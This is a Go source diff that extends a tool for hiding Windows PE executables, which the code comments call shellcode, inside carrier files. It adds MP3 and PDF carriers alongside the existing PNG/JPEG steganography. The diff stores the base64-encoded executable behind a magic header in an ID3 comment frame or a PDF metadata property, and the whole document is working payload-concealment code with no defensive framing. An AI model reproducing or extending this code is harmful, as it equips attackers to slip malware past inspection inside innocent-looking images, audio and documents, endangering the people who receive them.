@@ -2,6 +2,7 @@ package embed
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"image"
@@ -11,29 +12,34 @@ import (
 	"io/ioutil"
 	"path/filepath"
 	"strings"
+	
+	"github.com/bogem/id3v2" // For MP3 ID3 tag manipulation
+	"github.com/pdfcpu/pdfcpu/pkg/api" // For PDF manipulation
 )
 
 var MAGIC_HEADER = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
 
-// ImageFormat represents the supported image formats
-type ImageFormat int
+// Format represents the supported file formats for embedding shellcode
+type Format int
 
 const (
-	FormatPNG ImageFormat = iota
+	FormatPNG Format = iota
 	FormatJPEG
+	FormatMP3
+	FormatPDF
 )
 
-func EmbedPE(imagePath, pePath, outputPath string) error {
-	// Read the original image
-	imageData, err := ioutil.ReadFile(imagePath)
+func EmbedPE(filePath, pePath, outputPath string) error {
+	// Read the original file
+	fileData, err := ioutil.ReadFile(filePath)
 	if err != nil {
-		return fmt.Errorf("failed to read image file: %v", err)
+		return fmt.Errorf("failed to read file: %v", err)
 	}
 
-	// Detect image format
-	format, err := detectImageFormat(imageData, imagePath)
+	// Detect file format
+	format, err := detectFormat(fileData, filePath)
 	if err != nil {
-		return fmt.Errorf("unsupported image format: %v", err)
+		return fmt.Errorf("unsupported file format: %v", err)
 	}
 
 	// Read the PE file
@@ -42,22 +48,48 @@ func EmbedPE(imagePath, pePath, outputPath string) error {
 		return fmt.Errorf("failed to read PE file: %v", err)
 	}
 
-	// Embed the PE into the image
-	stegoImage, err := embedPEInImage(bytes.NewReader(imageData), peData, format)
-	if err != nil {
-		return fmt.Errorf("failed to embed PE into image: %v", err)
+	var outputData []byte
+	var err2 error
+	
+	// Embed the PE based on format
+	switch format {
+	case FormatPNG, FormatJPEG:
+		outputData, err2 = embedPEInImage(bytes.NewReader(fileData), peData, format)
+		if err2 != nil {
+			return fmt.Errorf("failed to embed PE into image: %v", err2)
+		}
+		
+		// Verify the output is still a valid image
+		if !isValidFile(outputData, format) {
+			return fmt.Errorf("output is not valid - embedding failed")
+		}
+		
+	case FormatMP3:
+		outputData, err2 = embedPEInMP3(filePath, peData, outputPath)
+		if err2 != nil {
+			return fmt.Errorf("failed to embed PE into MP3: %v", err2)
+		}
+		
+		// For MP3, we've already written the file in embedPEInMP3
+		fmt.Printf("Embedded %d bytes of PE data into MP3 ID3 tag\n", len(peData))
+		return nil
+		
+	case FormatPDF:
+		outputData, err2 = embedPEInPDF(filePath, peData, outputPath)
+		if err2 != nil {
+			return fmt.Errorf("failed to embed PE into PDF: %v", err2)
+		}
+		
+		// For PDF, we've already written the file in embedPEInPDF
+		fmt.Printf("Embedded %d bytes of PE data into PDF metadata\n", len(peData))
+		return nil
 	}
-
-	// Write the output
-	if err := ioutil.WriteFile(outputPath, stegoImage, 0644); err != nil {
+	
+	// Write the output for non-MP3 formats
+	if err := ioutil.WriteFile(outputPath, outputData, 0644); err != nil {
 		return fmt.Errorf("failed to write output file: %v", err)
 	}
-
-	// Verify the output is still a valid image
-	if !isValidImage(stegoImage, format) {
-		return fmt.Errorf("output is not a valid image - embedding failed")
-	}
-
+	
 	formatName := "PNG"
 	if format == FormatJPEG {
 		formatName = "JPEG"
@@ -66,34 +98,52 @@ func EmbedPE(imagePath, pePath, outputPath string) error {
 	return nil
 }
 
-// detectImageFormat determines the image format from file extension and content
-func detectImageFormat(imageData []byte, imagePath string) (ImageFormat, error) {
+// detectFormat determines the file format from file extension and content
+func detectFormat(fileData []byte, filePath string) (Format, error) {
 	// First try by file extension
-	ext := strings.ToLower(filepath.Ext(imagePath))
+	ext := strings.ToLower(filepath.Ext(filePath))
 	switch ext {
 	case ".png":
-		if isValidPNG(imageData) {
+		if isValidPNG(fileData) {
 			return FormatPNG, nil
 		}
 	case ".jpg", ".jpeg":
-		if isValidJPEG(imageData) {
+		if isValidJPEG(fileData) {
 			return FormatJPEG, nil
+		}
+	case ".mp3":
+		// Basic check for MP3 header
+		if len(fileData) > 3 && (bytes.Equal(fileData[:3], []byte("ID3")) || bytes.Equal(fileData[:2], []byte{0xFF, 0xFB})) {
+			return FormatMP3, nil
+		}
+	case ".pdf":
+		// Basic check for PDF header
+		if len(fileData) > 4 && bytes.Equal(fileData[:4], []byte("%PDF")) {
+			return FormatPDF, nil
 		}
 	}
 
 	// Try to detect by content
-	if isValidPNG(imageData) {
+	if isValidPNG(fileData) {
 		return FormatPNG, nil
 	}
-	if isValidJPEG(imageData) {
+	if isValidJPEG(fileData) {
 		return FormatJPEG, nil
 	}
+	// Basic check for MP3 header
+	if len(fileData) > 3 && (bytes.Equal(fileData[:3], []byte("ID3")) || bytes.Equal(fileData[:2], []byte{0xFF, 0xFB})) {
+		return FormatMP3, nil
+	}
+	// Basic check for PDF header
+	if len(fileData) > 4 && bytes.Equal(fileData[:4], []byte("%PDF")) {
+		return FormatPDF, nil
+	}
 
-	return FormatPNG, fmt.Errorf("unsupported image format (supported: PNG, JPEG)")
+	return FormatPNG, fmt.Errorf("unsupported file format (supported: PNG, JPEG, MP3, PDF)")
 }
 
 // embedPEInImage embeds PE bytes into an image using LSB steganography
-func embedPEInImage(imgReader io.Reader, peBytes []byte, format ImageFormat) ([]byte, error) {
+func embedPEInImage(imgReader io.Reader, peBytes []byte, format Format) ([]byte, error) {
 	// Decode the image
 	var img image.Image
 	var err error
@@ -207,14 +257,134 @@ func isValidJPEG(data []byte) bool {
 	return err == nil
 }
 
-// isValidImage checks if the provided bytes represent a valid image of the specified format
-func isValidImage(data []byte, format ImageFormat) bool {
+// isValidFile checks if the provided bytes represent a valid file of the specified format
+func isValidFile(data []byte, format Format) bool {
 	switch format {
 	case FormatPNG:
 		return isValidPNG(data)
 	case FormatJPEG:
 		return isValidJPEG(data)
+	case FormatMP3:
+		// Basic check for MP3 header
+		return len(data) > 3 && (bytes.Equal(data[:3], []byte("ID3")) || bytes.Equal(data[:2], []byte{0xFF, 0xFB}))
+	case FormatPDF:
+		// Basic check for PDF header
+		return len(data) > 4 && bytes.Equal(data[:4], []byte("%PDF"))
 	default:
 		return false
 	}
 } 
+
+// embedPEInMP3 embeds PE bytes into an MP3 file's ID3 tag
+func embedPEInMP3(mp3Path string, peBytes []byte, outputPath string) ([]byte, error) {
+	// First, copy the original MP3 file to the output path
+	originalData, err := ioutil.ReadFile(mp3Path)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read original MP3 file: %v", err)
+	}
+	
+	// Write to the output path
+	if err := ioutil.WriteFile(outputPath, originalData, 0644); err != nil {
+		return nil, fmt.Errorf("failed to create output MP3 file: %v", err)
+	}
+	
+	// Open the newly created output file to add tags
+	tag, err := id3v2.Open(outputPath, id3v2.Options{Parse: true})
+	if err != nil {
+		return nil, fmt.Errorf("failed to open output MP3 file: %v", err)
+	}
+	defer tag.Close()
+
+	// Prepare the data to embed: magic header + size + PE bytes
+	var dataBuffer bytes.Buffer
+	dataBuffer.Write(MAGIC_HEADER)
+	
+	// Write the size of PE bytes as uint32
+	sizeBytes := make([]byte, 4)
+	binary.LittleEndian.PutUint32(sizeBytes, uint32(len(peBytes)))
+	dataBuffer.Write(sizeBytes)
+	
+	// Write the actual PE bytes
+	dataBuffer.Write(peBytes)
+	
+	dataToEmbed := dataBuffer.Bytes()
+	
+	// Convert to base64 to ensure it's text-safe for ID3 tags
+	base64Data := make([]byte, base64.StdEncoding.EncodedLen(len(dataToEmbed)))
+	base64.StdEncoding.Encode(base64Data, dataToEmbed)
+	
+	// Add the data to a COMM tag (Comment)
+	commentFrame := id3v2.CommentFrame{
+		Encoding:    id3v2.EncodingUTF8,
+		Language:    "eng",
+		Description: "STEGO",
+		Text:        string(base64Data),
+	}
+	tag.AddCommentFrame(commentFrame)
+
+	// Save the file with the new tag
+	if err = tag.Save(); err != nil {
+		return nil, fmt.Errorf("failed to save MP3 with embedded data: %v", err)
+	}
+
+	// Read the output file to return its bytes
+	outputData, err := ioutil.ReadFile(outputPath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read output file: %v", err)
+	}
+
+	return outputData, nil
+}
+
+// embedPEInPDF embeds PE bytes into a PDF file's metadata
+func embedPEInPDF(pdfPath string, peBytes []byte, outputPath string) ([]byte, error) {
+	// First, copy the original PDF file to the output path
+	originalData, err := ioutil.ReadFile(pdfPath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read original PDF file: %v", err)
+	}
+	
+	// Write to the output path
+	if err := ioutil.WriteFile(outputPath, originalData, 0644); err != nil {
+		return nil, fmt.Errorf("failed to create output PDF file: %v", err)
+	}
+	
+	// Prepare the data to embed: magic header + size + PE bytes
+	var dataBuffer bytes.Buffer
+	dataBuffer.Write(MAGIC_HEADER)
+	
+	// Write the size of PE bytes as uint32
+	sizeBytes := make([]byte, 4)
+	binary.LittleEndian.PutUint32(sizeBytes, uint32(len(peBytes)))
+	dataBuffer.Write(sizeBytes)
+	
+	// Write the actual PE bytes
+	dataBuffer.Write(peBytes)
+	
+	dataToEmbed := dataBuffer.Bytes()
+	
+	// Convert to base64 to ensure it's text-safe for PDF metadata
+	base64Data := make([]byte, base64.StdEncoding.EncodedLen(len(dataToEmbed)))
+	base64.StdEncoding.Encode(base64Data, dataToEmbed)
+	
+	// Create PDF configuration - using nil for default configuration
+	
+	// Add the data to PDF metadata as custom property
+	properties := map[string]string{
+		"STEGO": string(base64Data),
+	}
+	
+	// Add metadata to the PDF
+	err = api.AddPropertiesFile(outputPath, outputPath, properties, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to add metadata to PDF: %v", err)
+	}
+	
+	// Read the output file to return its bytes
+	outputData, err := ioutil.ReadFile(outputPath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read output file: %v", err)
+	}
+	
+	return outputData, nil
+}
